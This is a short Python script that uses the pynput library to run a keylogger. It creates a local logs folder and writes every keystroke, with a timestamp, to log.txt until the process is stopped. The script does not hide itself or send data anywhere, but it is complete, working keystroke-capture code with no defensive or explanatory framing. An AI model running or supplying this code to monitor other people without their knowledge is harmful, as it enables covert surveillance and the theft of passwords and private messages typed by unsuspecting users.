from pynput.keyboard import Key, Listener
import os
import time


if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mknod("./logs/log.txt")

def on_press(key):
    with open('./logs/log.txt', 'a') as file:
        file.write('{}\t\t{}\n'.format(key, time.time()))    
    
with Listener(on_press=on_press) as listener:
    listener.join()    